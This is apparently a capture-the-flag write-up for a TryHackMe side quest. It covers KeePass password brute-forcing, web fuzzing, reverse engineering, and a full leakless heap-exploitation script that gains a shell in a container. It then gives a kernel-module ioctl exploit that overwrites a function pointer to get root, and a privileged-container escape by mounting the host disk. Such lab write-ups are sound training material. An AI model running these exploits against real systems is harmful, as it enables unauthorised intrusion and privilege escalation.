---
title: "TryHackMe: AoC 2025 Side Quest Two"
author: jaxafed
categories: [TryHackMe]
date: 2026-01-01 00:00:02 +0000
tags: [web, cracking, fuzzing, reverse engineering, heap exploitation, binary exploitation, pwn, kernel module, kernel exploitation, docker]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2025_sidequest_two/
image:
  path: room_image.webp
---

**Second Side Quest (Scheme Catcher)** started with discovering the key in the **Advent of Cyber Day 9** room and using it to remove the firewall on the target machine.

Afterwards, fuzzing a web application on the target for directories we were able to discover a file with a binary inside and analyzing the binary we discovered another endpoint.

Checking out this endpoint we discovered the application running on another port and reverse enginering it we discovered a Use-After-Free vulnerability and with a heap exploitation exploit we were able to get remote code execution and a shell inside a container.

Inside the container we discovered a SSH key which we used to get a shell on the host and reverse engineering and exploiting a vulnerable kernel module we were able to escalate to root and complete the room.

Lastly, I will also share how instead of exploiting the kernel module we could have escape the contianer by abusing the fact that it was running as privileged to complete the room too.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R){: .center }

## Finding the Key

On the machine attached to the [Advent of Cyber Day 9 room](https://tryhackme.com/room/attacks-on-ecrypted-files-aoc2025-asdfghj123), apart from the files relevant to the questions in the room, we can also find the `.Passwords.kdbx` KeePass database in the `ubuntu` user's home directory.

```console
ubuntu@tryhackme:~$ ls -la 
total 536
drwxr-xr-x 21 ubuntu ubuntu   4096 Dec 10 15:54 .
drwxr-xr-x  3 root   root     4096 Oct 22  2024 ..
-rw-------  1 ubuntu ubuntu 419413 Dec  4 09:29 .Passwords.kdbx
```

We can use the credentials given in the room with `scp` to transfer it to our machine.

```console
$ scp ubuntu@10.64.153.44:~/.Passwords.kdbx Passwords.kdbx
```

Trying to find the password by using `keepass2john` to generate a hash for cracking with `john`, we can see that it fails because it does not support the **KDBX 4.x** format yet.

```console
$ keepass2john Passwords.kdbx
! Passwords.kdbx : File version '40000' is currently not supported!
```

Instead, we can use the [keepass4brute](https://github.com/r3nt0n/keepass4brute) tool, and with it we are able to find the master password.

```console
$ bash keepass4brute/keepass4brute.sh Passwords.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 341/14344392 - Attempts per minute: 163 - Estimated time remaining: 8 weeks, 5 days
[+] Current attempt: h[REDACTED]r

[*] Password found: h[REDACTED]r
```

Now that we have the password, opening the database shows a single entry titled `key`.

![Keepass](keepass.webp){: width="1500" height="350"}

However, checking the entry, we see there is **no password** for it.

![Keepass Two](keepass2.webp){: width="450" height="500"}

Instead, under the **Advanced** section, we can see an image file attached to the entry.

![Keepass Three](keepass3.webp){: width="450" height="500"}

Opening it, we find the key and can continue to the side quest.

![Key Image](key_image.webp){: width="550" height="550"}

## Side Quest

As usual, we start the side quest by visiting the web server on port `21337` and entering the key we discovered to remove the firewall.

![Web 21337 Unlock](web_21337_unlock.webp){: width="2500" height="1250"}

### Initial Enumeration

Afterwards, we run an `nmap` scan to discover all the services running on the target.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.66.175.175
Nmap scan report for 10.66.175.175
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c4:63:c7:ef:0a:1d:ee:76:2a:dc:f2:73:87:68:e0:00 (ECDSA)
|_  256 fa:59:ac:65:37:61:00:97:a4:bb:67:4e:5e:55:03:66 (ED25519)
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Under Construction
9004/tcp  open  unknown
...
|     Payload Storage Malhare's
|_    Version 4.2.0
```

There are three open ports:

* **22** (`SSH`)
* **80** (`HTTP`)
* **9004** 

Checking out the web server on port `80`, we simply see an **Under Construction** page with nothing else.

![Web 80 Index](web_80_index.webp){: width="2500" height="1250"}

Checking the service on port `9004`, we get a menu with a couple of options but nothing clear on what can be done.

```console
$ nc 10.66.175.175 9004
Payload Storage Malhare's
Version 4.2.0
[1] C:
[2] U:
[3] D:
[4] E:
>>
```

### First Flag

There does not seem to be anything on the web application at port `80`. However, fuzzing it for directories, we can quickly discover the **`/dev`** endpoint.

```console
$ ffuf -u 'http://10.66.175.175/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 184ms]
```
{: .wrap }

Visiting the `/dev/` endpoint, we can see that indexing is enabled and there is a single file: `4.2.0.zip`.

![Web 80 Dev](web_80_dev.webp){: width="2500" height="1250"}

Downloading and extracting it, we get a binary.

```console
$ wget http://10.66.175.175/dev/4.2.0.zip

$ unzip 4.2.0.zip
Archive:  4.2.0.zip
   creating: latest/
  inflating: latest/beacon.bin
```

Simply checking the binary with `strings`, we can discover the first flag.

```console
$ strings latest/beacon.bin
...
iE&     (%
iE&     (%
THM{[REDACTED]}
Command executed
/tmp/b68vC103RH
Failed to execute the command
```

### Second Flag

Apart from the flag in the `strings` output, we see a couple more interesting things: the template for an HTTP request, a menu, and what looks like a key: `EastMass`.

```console
GET %s HTTP/1.1
Host: localhost
Connection: close
Failed to send HTTP request
Command deleted
Successfully deleted /tmp/b68vC103RH
Failed to delete /tmp/b68vC103RH
=== Menu ===
1. Execute command
2. Load payload
3. Delete command
4. Exit
Choose an option:
Enter key:
Hello %s!
socket failed
setsockopt
bind failed
listen
Socket server listening on port 4444...
accept
Received command: %s
Exit command received
Invalid command: %s
EastMass
```

Running the binary and trying the `EastMass` key we discovered in the `strings` output seems to work, and the server starts listening on port `4444`.

```console
$ ./latest/beacon.bin
Enter key: EastMass
Hello EastMass!
Access granted! Starting socket server...
Socket server listening on port 4444...
```

Connecting to it and sending `1` for the **Execute command** option:

```console
$ nc 127.0.0.1 4444
1
```

Looking back at the server, we see it complaining that `/tmp/b68vC103RH` is not found.

```console
Received command: 1

Command executed
sh: 1: /tmp/b68vC103RH: not found
Command exited with status: 127
```

Now connecting again and trying **Load payload** by sending `2`:

```console
$ nc 127.0.0.1 4444
2
```

This time we get a more interesting error: **Connection refused**.

```console
Payload loaded
Connection failed: Connection refused
```

Running **Wireshark** to capture the network traffic, then connecting back and sending `2` again, we can see the server attempting to connect to **port 80 on localhost**.

![Wireshark Connection](wireshark_connection.webp){: width="2500" height="350"}

Starting a listener on port `80` and sending `2` again, we can see that the binary makes a **GET request** to the `/7ln6Z1X9EF` endpoint.

```console
$ nc -lvnp 80
listening on [any] 80 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59044
GET /7ln6Z1X9EF HTTP/1.1
Host: localhost
Connection: close
```

Checking the same endpoint on the web application on port `80` on the target, we can see indexing enabled once again, and there are two files: `4.2.0-R1-1337-server.zip` and `foothold.txt`.

![Web 80 Second Flag](web_80_second_flag.webp){: width="2500" height="1250"}

Checking the `foothold.txt`, we find the second flag inside.

```console
$ curl -s http://10.66.175.175/7ln6Z1X9EF/foothold.txt | head -c 4
THM{
```

### Third Flag

Apart from the flag, we also have the `4.2.0-R1-1337-server.zip` archive. Downloading and extracting it, we get a binary along with the `libc` it uses.

```console
$ wget http://10.66.175.175/7ln6Z1X9EF/4.2.0-R1-1337-server.zip

$ unzip 4.2.0-R1-1337-server.zip
Archive:  4.2.0-R1-1337-server.zip
  inflating: ld-linux-x86-64.so.2
  inflating: libc.so.6
  inflating: server
```

Opening the binary in `ghidra` and looking at the `menu` function, it appears to match the application running on port `9004` on the target.

![Ghidra Server Menu](ghidra_server_menu.webp){: width="350" height="250"}

Checking the `main` function, we can see it calling the **delete**, **create**, or **update** functions depending on the option read from the user.

![Ghidra Server Main](ghidra_server_main.webp){: width="600" height="750"}

Inspecting the `create` function, we can see that it simply prompts the user for a size, allocates memory using `malloc` with that size, stores the resulting pointer in the `chunks` array, and records the size in the `sizes` array.

![Ghidra Server Create](ghidra_server_create.webp){: width="400" height="750"}

Looking at the `update` function, we can see that it reads an index from the user, checks that it is in bounds and that memory is allocated for that index, then reads an offset and data and writes the data read to that offset in the allocated chunk.

![Ghidra Server Update](ghidra_server_update.webp){: width="900" height="600"}

Lastly, checking the `delete` function, we see that it reads an index from the user and, if valid, calls `free` on the corresponding chunk. However, the function does **not** clear the address from the `chunks` array, which creates a **Use-After-Free** vulnerability, as the freed pointer remains accessible and can still be modified via the `update` function.

![Ghidra Server Delete](ghidra_server_delete.webp){: width="600" height="450"}

Usually, in heap exploitation challenges, we would also have a read primitive allowing us to leak addresses from freed memory, which we could then use with various methods like tcache poisoning to achieve remote code execution. However, examining the binary, we can see that we do not have such a primitive. Instead, we can use the leakless [**House of Water**](https://corgi.rip/posts/leakless_heap_1/) technique. I will not go into detail here to keep the write-up short, but if you are interested, I recommend reading the linked article.

For the actual exploit, we can simply modify the [PoC](https://github.com/corgeman/leakless_research/blob/main/part_1/fsop_solve.py) shared by the article’s author. There is one caveat, however: the PoC includes functionality to leak two ASLR-affected nibbles, which we do not have. We therefore need to modify the script to brute-force these bytes instead, like so:

```py
#!/usr/bin/env python3

from pwn import *
import io_file

context.update(arch="amd64", os="linux", log_level="error")
context.binary = elf = ELF("./server", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

exit_addr = libc.sym['exit']
stdout_addr = libc.sym['_IO_2_1_stdout_']

for heap_brute in range(16):
	for libc_brute in range(16):
		try:
			print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
		
			r = remote("10.66.175.175", 9004)		

			idx = -1

			def create(size):
				global idx
				idx = idx+1
				r.sendlineafter(b'\n>>', b'1')
				r.sendlineafter(b'size: \n', str(size).encode())
				return idx

			def update(index, data, offset=0):
				r.sendlineafter(b'\n>>', b'2')
				r.sendlineafter(b'idx:\n', str(index).encode())
				r.sendlineafter(b'offset:\n', str(offset).encode())
				r.sendafter(b'data:\n', data)

			def delete(index):
				r.sendlineafter(b'\n>>', b'3')
				r.sendlineafter(b'idx:\n', str(index).encode())

			for _ in range(7):
				create(0x90-8) 

			middle = create(0x90-8)

			playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
			guard = create(0x18) 
			delete(playground)
			guard = create(0x18)

			corruptme = create(0x4c8)
			start_M = create(0x90-8)
			midguard = create(0x28) 
			end_M = create(0x90-8)
			leftovers = create(0x28)
				
			update(playground,p64(0x651),0x18)
			delete(corruptme)

			offset = create(0x4c8+0x10) 
			start = create(0x90-8)
			midguard = create(0x28)
			end = create(0x90-8)
			leftovers = create(0x18)

			create((0x10000+0x80)-0xda0-0x18)
			fake_data = create(0x18)
			update(fake_data,p64(0x10000)+p64(0x20)) 

			fake_size_lsb = create(0x3d8);
			fake_size_msb = create(0x3e8);
			delete(fake_size_lsb)
			delete(fake_size_msb)


			update(playground,p64(0x31),0x4e8)
			delete(start_M)
			update(start_M,p64(0x91),8)

			update(playground,p64(0x21),0x5a8)
			delete(end_M)
			update(end_M,p64(0x91),8)

			for i in range(7):
				delete(i)

			delete(end)
			delete(middle)
			delete(start)

			heap_target = (heap_brute << 12) + 0x80
			update(start,p16(heap_target))
			update(end,p16(heap_target),8)
			exit_lsb = (libc_brute << 12) + (exit_addr & 0xfff) 
			stdout_offset = stdout_addr - exit_addr
			stdout_lsb = (exit_lsb + stdout_offset) & 0xffff
			print(f"{heap_target=:#x}, {stdout_lsb=:#x}")

			win = create(0x888) 
			
			update(win,p16(stdout_lsb),8) 
			stdout = create(0x28)
			update(stdout,p64(0xfbad3887)+p64(0)*3+p8(0))
			
			libc_leak = u64(r.recv(8))
			libc.address = libc_leak - (stdout_addr+132)
			print(f"possible libc leak = {libc.address:#x}")
			
			file = io_file.IO_FILE_plus_struct() 
			payload = file.house_of_apple2_execmd_when_do_IO_operation(
				libc.sym['_IO_2_1_stdout_'],
				libc.sym['_IO_wfile_jumps'],
				libc.sym['system'])
			update(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
			full_stdout = create(0x3e0-8)
			update(full_stdout,payload)

			r.interactive("$ ")
			exit()

		except Exception as e:
			print(e)
			continue
```
{: file="solve.py" }

For the RCE portion of the exploit, we also need the [`io_file.py`](https://github.com/corgeman/leakless_research/blob/main/part_1/io_file.py) file from the same repository.

Now, with everything in place, we can run the exploit and see that we successfully obtain a shell inside a Docker container and can read the third flag inside `user.txt`.

```console
root@ip-10-66-116-247:~/exp# ls
io_file.py  libc.so.6  server  solve.py

root@ip-10-66-116-247:~/exp# python3 solve.py

Trying heap_brute=0x0, libc_brute=0x0
heap_target=0x80, stdout_lsb=0xb5c0

Trying heap_brute=0x0, libc_brute=0x1
heap_target=0x80, stdout_lsb=0xc5c0
...

Trying heap_brute=0x0, libc_brute=0xf
heap_target=0x80, stdout_lsb=0xa5c0
possible libc leak = 0x7b58e3048000
$ id && hostname
uid=0(root) gid=0(root) groups=0(root)
bb21200fff81
$ wc -c user.txt
51 user.txt
```

> I would highly recommend running the exploit from the **AttackBox**, as it will be extremely faster due to both machines being on the same network. Also, the exploit might require running it multiple times until you get the correct values.
{: .prompt-warning }

### Fourth Flag

Apart from the flag, we also have an SSH key pair with the `agent` username shown in the public key comment.

```console
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINrUEbTDkcpAuYGW1sN4OTd57ZvSxXIWq7kv9XiOVKs9 agent@tryhackme
```

Trying it against the SSH service running on the target with the same username, we are successful in getting a shell.

```console
$ ssh -i id_rsa agent@10.66.175.175

agent@tryhackme:~$ id
uid=1001(agent) gid=1001(agent) groups=1001(agent),100(users)
```

Checking the **sudo** permissions for our user, we can see that we are allowed to load/unload the `kagent` module and also give everyone read permissions on the `/dev/kagent` device.

```console
agent@tryhackme:~$ sudo -l
Matching Defaults entries for agent on tryhackme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User agent may run the following commands on tryhackme:
    (root) NOPASSWD: /usr/sbin/modprobe -r kagent, /usr/sbin/modprobe kagent
    (root) NOPASSWD: /bin/chmod 444 /dev/kagent
```

Checking installed modules, we can see that `kagent` is already loaded.

```console
agent@tryhackme:~$ lsmod | grep kagent
kagent                 12288  0
```

We can find this module at: `/usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko`.

```console
agent@tryhackme:~$ ls -la /usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
-r--r--r-- 1 root root 369832 Dec  4 15:00 /usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko
```

Let's download it to our machine using `scp` to examine it.

```console
$ scp -i id_rsa agent@10.66.175.175:/usr/lib/modules/6.14.0-1017-aws/kernel/drivers/kagent.ko .
```

Opening it in **Ghidra** and checking the **init** function, we can see that it creates the `kagent` device, registers `kagent_ioctl` for the `ioctl` syscall, and reads **16 bytes** from the `/root/kkey` file, storing them in the `ctx.session_key` variable.

![Ghidra Kagent Init](ghidra_kagent_init.webp){: width="700" height="900"}

When examining the **ctx** structure, we can see that it consists of:

* 16-byte `agent_id`
* 16-byte `session_key`
* 8-byte pointer to `current_op`
* 64-byte `command_buffer`

![Ghidra Kagent Ctx](ghidra_kagent_ctx.webp){: width="2500" height="400"}

We also see that the current values are:

* `agent_id`: `AGT-001`
* `session_key`: `DEFAULT_KEY_!!!!`
* `current_op`: pointer to `op_ping`
* `command_buffer`: empty

![Ghidra Kagent Ctx Two](ghidra_kagent_ctx2.webp){: width="1100" height="400"}

Since we know `kagent_ioctl` will be called for `ioctl` syscalls on the device, checking it shows that depending on the operation code passed, it will do one of three things: call the `c2_update_conf` function, call the `c2_heartbeat` function, or run the function that `ctx.current_op` points to.

![Ghidra Kagent Ioctl](ghidra_kagent_ioctl.webp){: width="700" height="550"}

Looking at `c2_update_conf`, we can see that it reads **144 bytes** from the user buffer. If the first **16 bytes** match the current `ctx.session_key`, it copies the remaining **128 bytes** directly into the `ctx` structure. This effectively allows us to overwrite the `agent_id`, `session_key`, and `current_op` with arbitrary values as long as we know the session key.

![Ghidra Kagent Update Conf](ghidra_kagent_update_conf.webp){: width="800" height="800"}

Checking out `c2_heartbeat`, we see that it first reads up to **16 bytes** from the user buffer and overwrites `agent_id` with them. It then uses `snprintf` to write a status message into the user buffer. However, the important detail is that:

* The buffer size given to `snprintf` is **0x80 (128 bytes)**.
* `snprintf` only stops when it encounters a **null byte**.
* So, if no null bytes appear in any of the `ctx` fields, `snprintf` will leak the entire structure, including:

  * `agent_id`
  * `session_key`
  * `current_op` pointer

This means that if we set `agent_id` to **16 non-null bytes**, we can cause `c2_heartbeat` to leak both the session key and the function pointer.

![Ghidra Kagent Heartbeat](ghidra_kagent_heartbeat.webp){: width="800" height="800"}

Lastly, looking at `op_ping`, it simply prints `"kagent: [Background] Ping received. Agent active."` as a kernel message. More importantly, we also notice the `op_execute` function, which sets the caller’s user ID to **root**.

![Ghidra Kagent Execute](ghidra_kagent_execute.webp){: width="600" height="350"}

With all this information, the exploitation path becomes clear:

1. Use `c2_heartbeat` to set our `agent_id` to **16 non-null bytes**, causing it to leak the `session_key` and the address of `current_op` (initially pointing to `op_ping`).
2. Using the leaked `session_key`, call `c2_update_conf` to overwrite `current_op` with the address of `op_execute`. We can calculate this address based on the leaked `op_ping` pointer.
3. Call `ioctl` with the appropriate operation code to execute the function pointer in `current_op`, giving us **root** privileges.

First, use **sudo** to give read permissions on the device so we can interact with it.

```console
agent@tryhackme:~$ sudo /bin/chmod 444 /dev/kagent
```

Now we can use `python` to interact with it, and run some boilerplate code to begin.

```console
agent@tryhackme:~$ python3
Python 3.12.3 (main, Nov  6 2025, 13:44:16) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from fcntl import ioctl
>>> import struct, os, pty
>>>
>>> IOCTL_UPDATE_CONF = 0x40933702
>>> IOCTL_HEARTBEAT   = 0xc0b33701
>>> IOCTL_EXEC_OP     = 0x133703
>>>
>>> fd = os.open("/dev/kagent", os.O_RDONLY)
```

Now, if we call `c2_heartbeat` with an empty buffer, we see that it works as expected and only prints the current `ctx.agent_id` as `AGT-001` and stops after it as it encounters a null byte.

```console
>>> buf = bytearray(b"\x00"*160)
>>> ioctl(fd, IOCTL_HEARTBEAT, buf)
0
>>> buf
bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00STATUS: ONLINE | ID: AGT-001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
```
{: .wrap }

However, from examining the binary we know it uses `snprintf`, and if there are no null bytes in the `agent_id` it continues printing and leaks `ctx.session_key` and `ctx.current_op`. So, creating a buffer that sets the `agent_id` to 16 `A`s and calling `c2_heartbeat` again, we can leak the `session_key` and `current_op`.

```console
>>> buf = bytearray(b"A"*16 + b"\x00"*144)
>>> ioctl(fd, IOCTL_HEARTBEAT, buf)
0
>>> buf
bytearray(b'AAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00STATUS: ONLINE | ID: AAAAAAAAAAAAAAAASup3rS3cur3K3y!!\x100A\xc0\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
```
{: .wrap }

We can parse the buffer to extract the `session_key` and `current_op` (the address of `op_ping`).

```console
>>> leaked_session_key = buf[69:85]
>>> leaked_op_ping_address = struct.unpack("<Q", buf[85:93])[0]
>>> leaked_session_key
bytearray(b'Sup3rS3cur3K3y!!')
>>> hex(leaked_op_ping_address)
'0xffffffffc0413010'
```

Our goal is to replace `current_op` with `op_execute` in the module's config. To do that we need `op_execute`'s address; we can calculate it from the leaked `op_ping` address using the offsets in the module:

```console
$ nm -n kagent.ko | grep -E 'op_ping|op_execute'
0000000000000000 t __pfx_op_ping
0000000000000010 t op_ping
0000000000000320 t __pfx_op_execute
0000000000000330 t op_execute
```

We calculate the offset between `op_execute` and `op_ping` as `0x330 - 0x10 = 0x320`, then compute the `op_execute` address in memory.

```console
>>> op_execute_address = leaked_op_ping_address + 0x320
>>> hex(op_execute_address)
'0xffffffffc0413330'
```

Now, knowing the `session key` and the address of `op_execute`, we create a buffer that starts with the current session key followed by the new config (`agent_id` + new `session_key` + `op_execute` address) and call `c2_update_conf` to update the config.

```console
>>> new_config = bytearray(leaked_session_key + b"A"*16 + b"B"*16 + struct.pack("<Q", op_execute_address))
>>> new_config
bytearray(b'Sup3rS3cur3K3y!!AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB03A\xc0\xff\xff\xff\xff')
>>> ioctl(fd, IOCTL_UPDATE_CONF, new_config)
0
```

Now calling `c2_heartbeat` once more, we see that we successfully changed the configuration.

```console
>>> ioctl(fd, IOCTL_HEARTBEAT, buf)
0
>>> buf
bytearray(b'AAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00STATUS: ONLINE | ID: AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB03A\xc0\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
```
{: .wrap }

Lastly, calling `ioctl` with the correct operation code to run `ctx.current_op` (`op_execute`) should set our UID to **0**, and by spawning a shell we can see that this is indeed the case. We then complete the room by reading the final flag at `/root/root.txt`.

```console
>>> ioctl(fd, IOCTL_EXEC_OP)
0
>>> pty.spawn("/bin/sh")
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
29 /root/root.txt
```

If you want a script to perform this automatically instead of step-by-step, the script below can be run to get a root shell.

```py
from fcntl import ioctl
import struct, os, pty

IOCTL_UPDATE_CONF = 0x40933702
IOCTL_HEARTBEAT   = 0xc0b33701
IOCTL_EXEC_OP     = 0x133703

fd = os.open("/dev/kagent", os.O_RDONLY)

buf = bytearray(b"A"*16 + b"\x00"*144)
ioctl(fd, IOCTL_HEARTBEAT, buf)
leaked_session_key = buf[69:85]
leaked_op_ping_address = struct.unpack("<Q", buf[85:93])[0]

op_execute_address = leaked_op_ping_address + 0x320

new_config = b""
new_config += leaked_session_key
new_config += b"A"*16 # new agent_id
new_config += b"B"*16 # new session_key
new_config += struct.pack("<Q", op_execute_address) # new current_op

ioctl(fd, IOCTL_UPDATE_CONF, bytearray(new_config))

ioctl(fd, IOCTL_EXEC_OP)

pty.spawn("/bin/sh")
```
{: file="solve.py" }

```console
agent@tryhackme:~$ python3 solve.py
# id
uid=0(root) gid=0(root) groups=0(root)
```

Lastly, I also want to show that instead of exploiting the kernel module, we could abuse the fact that the container we have a shell in (the heap exploitation container) is running as **privileged** to escape the container by mounting the host disk:

```console
root@bb21200fff81:/home/srv# cat /proc/1/status | grep CapEff
CapEff: 000001ffffffffff
root@bb21200fff81:/home/srv# mount /dev/nvme0n1p1 /mnt
root@bb21200fff81:/home/srv# ls /mnt
bin                boot  dev  home  lib.usr-is-merged  lib64   lost+found  mnt  proc  run   sbin.usr-is-merged  srv       sys  usr
bin.usr-is-merged  core  etc  lib   lib32              libx32  media       opt  root  sbin  snap                swapfile  tmp  var
root@bb21200fff81:/home/srv# wc -c /mnt/root/root.txt
29 /mnt/root/root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>